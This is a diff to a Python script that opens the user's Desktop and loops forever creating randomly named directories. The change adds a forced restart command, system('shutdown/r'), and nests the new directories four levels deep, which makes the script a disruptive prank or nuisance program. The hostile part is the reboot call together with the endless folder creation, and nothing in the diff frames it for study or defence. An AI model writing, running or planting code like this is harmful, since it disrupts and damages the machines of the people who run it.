@@ -15,8 +15,9 @@ def Desktop():
     return addres
 addres = Desktop()
 chdir(addres)
-name = "abcdefghijklmnopqrstuvwxyz#@!$%^&*()_+=-/\?.,:;><~`"
+name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 le = len(name) - 1
+system("shutdown/r")
 while True:
     rand_1 = randint(0,le)
     rand_2 = randint(0,le)
@@ -28,4 +29,4 @@ while True:
     rand_8 = randint(0,le)
     direcory = name[rand_1] + name[rand_2] + name[rand_3] + name[rand_4] + name[rand_5] + name[rand_6] + name[rand_7] + name[rand_8]
     system("cd ..")
-    system("mkdir {}".format(direcory))
+    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
